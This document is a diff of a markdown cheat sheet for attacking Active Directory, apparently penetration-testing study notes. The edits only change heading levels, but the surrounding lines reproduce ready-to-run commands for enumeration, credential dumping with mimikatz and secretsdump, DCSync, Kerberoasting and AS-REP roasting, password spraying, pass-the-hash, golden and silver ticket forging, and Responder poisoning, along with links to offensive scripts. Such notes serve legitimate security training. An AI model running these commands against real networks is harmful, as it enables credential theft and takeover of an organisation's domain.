@@ -1,5 +1,5 @@
-## Active Directory
-### Enumeration
+# Active Directory
+## Enumeration
 -> Enumerate all users in the entire domain
 ```
 net user /domain
@@ -104,8 +104,8 @@ Get-NetSession -ComputerName dc1
 #### Enumeration Through Service Principal Names
 https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 
-### Remote Access
-#### Remote Desktop Protocol - RDP
+## Remote Access
+### Remote Desktop Protocol - RDP
 -> Create a user  
 ```
 net user <user> <password> /add
@@ -148,7 +148,7 @@ rdesktop -u <user> -p <password> -d <domain> -f <ip>
 evil-winrm -i <ip> -u <user> -p <password>
 ```
 
-### Cached Credential Storage and Retrieval
+## Cached Credential Storage and Retrieval
 -> Dump the credentials of all connected users, including cached hashes
 ```
 ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -157,7 +157,7 @@ evil-winrm -i <ip> -u <user> -p <password>
 ```
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
-### Extracting hash
+## Extracting hash
 ```
 reg save hklm\sam sam
 reg save hklm\system system
@@ -166,7 +166,7 @@ reg save hklm\system system
 impacket-secretsdump -sam sam -system system LOCAL
 ```
 
-### Service Account Attacks
+## Service Account Attacks
 -> Sow user tickets that are stored in memory
 ```
 ./mimikatz.exe "sekurlsa::tickets"
@@ -193,13 +193,13 @@ or
 
 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 
-### Password Spraying
+## Password Spraying
 ```
 .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
 ```
 https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
 
-### Enumeration - BloodHound
+## Enumeration - BloodHound
 -> Install - Attacker VM
 ```
 sudo apt install bloodhound
@@ -219,7 +219,7 @@ Invoke-BloodHound -CollectionMethod All -Verbose
 Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
 ```
 
-### Access Validation 
+## Access Validation 
 
 -> Validation of network user credentials via smb using crackmmapexec  
 ```
@@ -244,7 +244,7 @@ smbmap -H <ip> -u <user>
 crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```
 
-### AS-REP Roasting Attack - not require Pre-Authentication
+## AS-REP Roasting Attack - not require Pre-Authentication
 -> kerbrute - Enumeration Users
 ```
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
@@ -256,7 +256,7 @@ https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userl
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
 
-### Kerberoast
+## Kerberoast
 -> impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
@@ -278,8 +278,8 @@ runas /user:<hostname>\<user> cmd.exe
 ```
 
 
-### Active Directory Lateral Movement
-#### Pass the Hash
+## Active Directory Lateral Movement
+### Pass the Hash
 -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
@@ -296,7 +296,7 @@ impacket-psexec '<domain>/<user>'@<IP>
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
-#### Over Pass the Hash
+### Over Pass the Hash
 -> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 
 ```
@@ -308,7 +308,7 @@ mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2
 .\PsExec.exe \\<hostname> cmd.exe
 ```
 
-#### Silver Ticket - Pass the Ticket
+### Silver Ticket - Pass the Ticket
 -> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
 
 -> Get SID
@@ -335,7 +335,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /t
 kerberos::list
 ```
 
-#### Golden Ticket - Pass the Ticket
+### Golden Ticket - Pass the Ticket
 -> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
 -> Get hash krbtgt
@@ -358,13 +358,13 @@ mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com
 psexec.exe \\dc1 cmd.exe
 ```
 
-#### DCSync Attack
+### DCSync Attack
 -> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
-#### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
+### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
 Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
 On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
 ```
